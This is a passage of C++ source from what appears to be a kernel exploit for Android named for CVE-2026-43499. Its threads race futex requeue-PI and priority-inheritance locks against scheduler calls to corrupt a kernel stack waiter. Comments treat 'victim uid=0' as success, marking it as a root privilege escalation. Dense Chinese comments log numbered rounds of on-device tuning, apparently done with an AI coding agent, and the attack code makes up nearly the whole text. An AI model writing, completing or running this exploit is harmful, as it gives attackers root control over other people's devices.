                landed ? route::RouteResultCode::Ok : route::RouteResultCode::FallbackSafe);
            shared_.status_step = landed ? 0 : 61;
            /* PI-OUT-TRIGGER：trigger 自己的跨度到此为止。**注意：PI 没有结束** —— 本函数返回后
             *  仍回到 waiter_main 的 PI 段内（那边的 PI-OUT 在摘除之后）。 */
        }

        /** Whether the copy is one the kernel accepted: either it returned success, or it refused for
         *  the one reason that still means the structure was copied -- the address a multicast group
         *  source would need is not there. The retired route's rule, kept. */
        [[nodiscard]] static bool shape_landed(std::int32_t result, std::int32_t error) noexcept {
            return result == 0 || error == Ops::addr_not_available();
        }

        void *waiter_main() noexcept {
            pin_self(config_.main_cpu);
            const std::int32_t tid = Ops::thread_id();
            shared_.waiter_tid.store(tid);
            /* This thread takes the chain lock first: that link is what makes its park a link in a
             * priority-inheritance chain rather than an ordinary wait. */
            /* ★★ 第 182 轮 ✓（旧码 `mr_y` 同形 ✓）：**锁用的是 **另一个字**（旧码是 `mr_l2` ✓）——
             *  原先与 park/requeue 共用 `chain_word` ✗ ⇒ **"在自己锁着的字上 park"** ⇒
             *  `lock_pi` 返回 -1（真机 `waiter=-1` ✓）⇒ requeue 无 waiter ⇒ **EAGAIN(11)** ✗✓ */
            errno = 0;
            /* ★★ 第 254 轮 ✓（按 ref 指示：`ghostlock-app-ref/src/core/race/threads.cpp:24` 逐字 ——
             *  等待者持有的是 **`chain_futex`** ✓；本树原持 `wait_word` ✗ ⇒ 与 `:555` 的 `unlock_pi(chain_word)`
             *  不配对（⇒ 孤儿 unlock，自证错位 ✓）。 */
            shared_.waiter_result = Ops::lock_pi(&shared_.chain_word);
            shared_.lock_result = shared_.waiter_result;
            shared_.lock_errno = errno;   /* 紧接 syscall 后取（PI 内只落字段，出 PI 打印） */
            /* ★★ 第 203 轮**删**✓（旧码分工 ✓）：waiter **不该锁 `target_word`** ✗ —— 那是 owner 的角色
             *  （旧码 `mr_y` 只锁 `mr_l2` ✓，`mr_x` 才锁 `mr_l1` ✓）⇒ 两者争锁 ⇒ **互等 ⇒ 卡死** ✗（真机 ✓）。 */
            shared_.waiter_ready.store(1);
            while (shared_.owner_started.load() == 0 && shared_.consumer_stop.load() == 0) {
                Ops::yield();
            }
            /* ★ 第 122 轮 ✓：`waiter_waiting` **移到 park 返回之后**（原先在 park 之前 ✗）——
             *  `requeue()`（`:342` ✓）等的就是它 ⇒ 原先它一置位 requeue 即可发起 ✗ ⇒
             *  **⇒ 内核可能在 waiter 尚未 park 时搬链 ⇒ 拷贝无处落 ⇒ 写不发生** ✗ ⇒ 现与 park 串行 ✓。 */
            /* ★★ 第 240 轮 ✓（根因确证 ✓）：`waiter_waiting` 的置位**提前到 park 之前** ——
             *  此前（第 122 轮）它在 park **返回之后** ✗ ⇒ `requeue()` 的门控（`:364` ✓）等的正是它
             *  ⇒ ⇒ **⇒ requeue 必然在"park 已结束"之后发出 ⇒ 那一刻 `uaddr` 上已无 PI 等待者
             *  ⇒ 内核返回 `EAGAIN(11)`** ✗（真机 **15/15** ✓ 逐字 `requeue ret=-1 errno=11` ✓）。
             *  而它之所以曾被推到 park 之后，是怕"内核在 waiter 尚未 park 时搬链 ⇒ 拷贝无处落" ✗
             *  ⇒ ⇒ **⇒ 该顾虑由 requeue 侧**已有的 `settle_us` 宽限**承担（`:367` ✓，值走 wire ✗ 不写死 ✓）**
             *  ⇒ 两全：门控提前释放 ＋ 宽限保证"已进入 park" ✓。
             *  完成 = 真机 `requeue ret=-1 errno=35`（EDEADLK ✓ 旧码成功形态）＋ `main: victim uid=0`
             *         ＋ 用户确认 ⇒ 删本注释块（AGENTS §3 有界性 ✓）。 */
            /* PI-IN：park 前最后一次同步（旧「窗口体」定义里的起点锚，语义未变）—— 从这里到本函数
             *  末尾的 PI-OUT，pi_window.hpp:12-21 的禁令成立（守卫的起点锚 ✓）。 */
            shared_.waiter_waiting.store(1);   /* 旧位置在 park 之后（原文保留 ✓）：见下方注释块 */
            const std::int64_t park_us = static_cast<std::int64_t>(config_.park_ms) * 1000;
            /* park-about 的两个数在**这里**取快照（两个 futex 字是活的，出 PI 再读就不是这一刻的值）。 */
            shared_.park_wait_word = shared_.wait_word;
            shared_.park_target_word = shared_.target_word;
            const std::int32_t parked =
                /* ★ 与退役对齐：park 在**自己持有的那个字**（chain_word ✓）上 —— 退役是
                 *  wait_requeue_pi(chain, target)（先 lock_pi(chain) 再在 chain 上 park ✓）。
                 *  此前 park 在 wait_word ✗ ⇒ 与"持有的字"不是同一个 ⇒ 链上的位置不对。 */
                /* ★★ 第 250 轮 ✓（根因：**锁的字**与 **park 的字**必须同一个 ✓ —— 旧码 `lock_pi(l2)` 再在 `l2` 上 park ✓）：
                 *  旧码（原文保留 ✓）：`Ops::wait_requeue_pi_until(&shared_.**chain_word**, …)` ✗ —— 而 waiter 持有的是
                 *  `wait_word` ✗（`:505` ✓）⇒ 内核在 `chain_word` 上**看不到**该等待者 ⇒ requeue 得 **EAGAIN(11)** ✗。 */
                /* ★★ 第 252 轮 ✓（内核契约：**停在 `uaddr`（= chain_word ✗）**、**持有 `uaddr2`（= wait_word ✓）**
                 *  两者必须**不同** ✗ —— 第 250 轮让它们同为 `wait_word` ⇒ **EINVAL(22)** ✗（真机 32/32 ✓）。 */
                /* 第 252/254 轮**回退** ✗：`uaddr2` 改 `wait_word` ⇒ 真机 `EAGAIN(11)` ×30 ✗
                 *  （⇒ 四种组合全量后：`(chain,target)` 11 ✗ ／ `(wait,target)` 22 ✗ ／ `(chain,wait)` 11 ✗）
                 *  ⇒ **⇒ 疑点不在"哪个字"，而在"等待者是否真的停在 `uaddr` 上"** ⇒ 恢复冻结参照 ✓。 */
                /* ★★ 第 254 轮 ✓（ref `:48` 逐字：**停在** `wait_futex` ✓、目标 `target_futex` ✓）⇒ 本树改为
                 *  停在 `wait_word` ✓（⇒ 与"持有 `chain_word`"分工一致 ✓）。 */
                Ops::wait_requeue_pi_until(&shared_.wait_word, &shared_.target_word, park_us);
            /* 旧码（原文保留 ✓，第 122 轮的置位 → 已上移至 park 之前 ✗）：
             *     shared_.waiter_waiting.store(1);    // park 已完成 ⇒ 此时才放行 requeue（⇒ EAGAIN ✗） */
            /* ★ 诊断（第 255 轮 ✓）：park 的**返回值与 errno** —— 本树此前**只有** `waiter lock` 一条读数 ✗，
             *  而四次真机的矩阵（`uaddr` 取 `wait_word` ⇒ EINVAL ✗／取 `chain_word` ⇒ EAGAIN ✗）指向
             *  "**等待者从未停驻**" ✓ ⇒ 此处是唯一没有观测量的环节 ✓（⇒ 验证后连同本块一并清理 ✓）。 */
            shared_.park_errno = errno;   /* 紧接 park 返回后取 ✓（下一句可能改动 errno ✗） */
            shared_.waiter_result = parked;
            /* ★ requeue 由**本线程**做（第 148 轮 ✓）：脆弱版 `remove_waiter()` **读 `current`** ✓
             *  （"The copy landing on the caller's stack is a race against skb page recycling" ✓）
             *  ⇒ 只有刚被 park 释放过那份 waiter 的线程，其栈上才有可覆盖的形状 ✓。 */
            /* ★★ 第 148 轮实测 ✗：在此调 `requeue()` ⇒ **`w2` 不再完成** ✗（⇒ 第 124 轮同现象 ✓）
             *  ⇒ 结论：本树里"waiter 线程自己做 requeue"属**结构性不兼容** ✗ ⇒ 已回退 ✓。 */
            trigger();
            shared_.route_done.store(1);
            (void) Ops::unlock_pi(&shared_.chain_word);
            while (shared_.owner_chain_done.load() == 0) {
                Ops::sleep_micros(100);
            }
            /* ★ 术后 ghost disarm（第 79 轮 ✓，退役 `race/threads.cpp:65-75` 逐字同形 ✓）：
             *  `remove_waiter()` 已把本线程的 `pi_blocked_on` 指向**被回收的栈 waiter** ✗ ⇒
             *  若不摘除，线程退出会留下"**可被 walk 的幽灵**"✗ ⇒ walk 指向它，而不是我们页里
             *  那三个字所描述的 target ✓ ⇒ 必须"**趁栈帧还活着**"再走一次慢路径摘除 ✓。
             *  退役判据：`route_needs_ghost_disarm(profile)` = `policy.multicast` ✓（只 multicast ✓）。
             *  判据：真机出现 `mcast ghost disarm ret=-1 errno=110` ✓ ⇒ 再看 `victim uid` ✓。 */
#if defined(__ANDROID__)
            if (config_.needs_ghost_disarm) {
                const std::uint32_t dummy_pi =
                        0x80000000U | static_cast<std::uint32_t>(::getpid());
                const timespec expired{.tv_sec = 0, .tv_nsec = 0};
                errno = 0;
                const int disarm = Ops::futex(const_cast<std::uint32_t *>(&dummy_pi),
                                              FUTEX_LOCK_PI, 0U, &expired, nullptr);
                shared_.disarm_result = disarm;
                shared_.disarm_errno = errno;   /* 紧接摘除调用后取 ✓ */
            }
#endif
            /* PI-OUT：摘除完成 ⇒ 本线程的 PI 段到此为止（守卫的终点锚 ✓）；本函数此后不再 IO ✓。 */
            return nullptr;
        }

        void *owner_main() noexcept {
            pin_self(config_.main_cpu);
            /* PI-IN：owner 从这里进入 PI（取目标锁 ⇒ 成为链主）；到末次 unlock 之后的 PI-OUT 为止。 */
            /* The target lock first: the waiter's park is a request to be moved onto it. */
            shared_.owner_result = Ops::lock_pi(&shared_.target_word);
            /* ★★ 第 261 轮 ✓（按 ref 指示：`ghostlock-app-ref/.../race/threads.cpp:82-87` 逐字 ——
             *  owner **先** `LOCK_PI(target_futex)` ✓ **再** `owner_started.store(1)` ✓✓）——
             *  本树的置位此前在 **main 线程**里、紧跟 `pthread_create` ✗ ⇒ **⇒ 门控在 owner 尚未持有
             *  `target_word` 时就被放行** ✗ ⇒ ⇒ 其后果与真机两处读数**逐字吻合**：
             *    `requeue ret=0`（⇒ 内核**看不到**可 requeue 的 PI 等待者 ⇒ 唤醒 0 个 ✓）
             *    `park errno=110`（⇒ 该等待者**始终没被唤醒** ✓）。
             *  ⇒ 本行即 ref 的 `:87` ✓；`main` 侧那一处已按 §3 套注释 ✓。 */
            shared_.owner_started.store(1);
            while (shared_.waiter_ready.load() == 0 && shared_.owner_stop.load() == 0) {
                Ops::yield();
            }
            if (shared_.owner_stop.load() != 0) {
                (void) Ops::unlock_pi(&shared_.target_word);
                return nullptr;
            }
            shared_.owner_started.store(1);
            /* Then the chain lock. The waiter holds it while it is parked, so this call is the chain:
             * it returns only once the waiter has released it after its trigger. */
            (void) Ops::lock_pi(&shared_.chain_word);
            shared_.owner_chain_done.store(1);
            while (shared_.owner_stop.load() == 0) {
                Ops::sleep_micros(100);
            }
            (void) Ops::unlock_pi(&shared_.target_word);
            /* PI-OUT：owner 交还目标锁 ⇒ 本线程的 PI 段到此为止（守卫的终点锚 ✓）。 */
            return nullptr;
        }

        void *consumer_main() noexcept {
            pin_self(config_.consumer_cpu);
            /* PI-IN-CONSUMER：consumer 从这里进入 PI —— 本函数只做一件事：在 waiter 停泊期间让内核
             *  走一次 PI 链（`Ops::setattr`，被拒时退回自持的目标锁）。轮次在循环里重复，所以这段 PI
             *  用**整个循环**表示；线程自身的 pin 在 PI 之前，不在扫描段内（2026-10-12 裁定同此）。 */
            std::int32_t seen = 0;
            while (shared_.consumer_stop.load() == 0) {
                const std::int32_t sequence = shared_.consumer_go.load();
                if (sequence == 0 || sequence == seen) {
                    Ops::yield();
                    continue;
                }
                seen = sequence;
                const std::int32_t tid = shared_.waiter_tid.load();
                std::int32_t calls_this_round = 0;
                while (shared_.consumer_stop.load() == 0 && shared_.consumer_go.load() == sequence) {
                    const std::int32_t delay = shared_.route_delay_usec.load();
                    if (delay > 0) {
                        Ops::sleep_micros(delay);
                    }
                    for (std::int32_t burst = 0; burst < config_.burst_calls; ++burst) {
                        if (shared_.consumer_stop.load() != 0 ||
                            shared_.consumer_go.load() != sequence) {
                            break;
                        }
                        shared_.consumer_calls.fetch_add(1);
                        shared_.consumer_inflight.store(1);
                        const std::int32_t nice =
                            (calls_this_round % config_.nice_modulus) + 1;
                        const std::int32_t accepted = Ops::setattr(tid, nice, config_.policy);
                        if (accepted != 0) {
                            /* The fallback: a lock the consumer itself takes and gives back. The
                             * retired consumer keeps it for the rounds where the scheduling call is
                             * refused, which on this device is most of them. */
                            if (Ops::lock_pi_until(&shared_.target_word, config_.fallback_lock_us) == 0) {
                                (void) Ops::unlock_pi(&shared_.target_word);
                            }
                        }
                        if (accepted == 0) {
                            shared_.consumer_success.fetch_add(1);
                        }
                        shared_.consumer_inflight.store(0);
                        /* 相位二（退役 waiter.post_adjust_settle_us）：调整之后留出内核走链的时间。 */
                        if (config_.post_adjust_settle_us > 0) {
                            Ops::sleep_micros(config_.post_adjust_settle_us);
                        }
                        ++calls_this_round;
                        if (calls_this_round >= config_.max_calls) {
                            shared_.consumer_go.store(0);
                            break;
                        }
                    }
                }
            }
            /* PI-OUT-CONSUMER：循环退出 ⇒ 本线程的 PI 动作到此为止（不再触发链、不再触碰目标锁）✓ */
            return nullptr;
        }

        /** 当前线程 pin 到一个 CPU（退役门禁的固定 CPU 对）。零/负 CPU 表示不 pin。 */
        static void pin_self(std::int32_t cpu) noexcept {
#if defined(__ANDROID__)
            if (cpu < 0) {   /* 负数 = 不 pin；0 是合法 CPU ✓ */
                return;
            }
            cpu_set_t set{};
            CPU_ZERO(&set);
            CPU_SET(static_cast<std::size_t>(cpu), &set);
            (void) ::sched_setaffinity(0, sizeof(set), &set);
#else
            static_cast<void>(cpu);   /* 主机没有这套亲和性 API；演员线程只在设备上跑 ✓。 */
#endif
        }

        static void *waiter_entry(void *self) noexcept {
            return static_cast<MulticastRoute *>(self)->waiter_main();
        }
        static void *owner_entry(void *self) noexcept {
            return static_cast<MulticastRoute *>(self)->owner_main();
        }
        static void *consumer_entry(void *self) noexcept {
            return static_cast<MulticastRoute *>(self)->consumer_main();
        }

        MulticastRouteConfig config_{};
        alignas(64) std::uint8_t stamp_[kMaxStampBytes] = {};
        MulticastRouteShared shared_{};
        MulticastRouteReport report_{};
        pthread_t waiter_{};
        pthread_t owner_{};
        pthread_t consumer_{};
        bool waiter_started_ = false;
        bool owner_started_ = false;
        bool consumer_started_ = false;
    };
}  // namespace ghostlock::backend::cve_2026_43499::landing
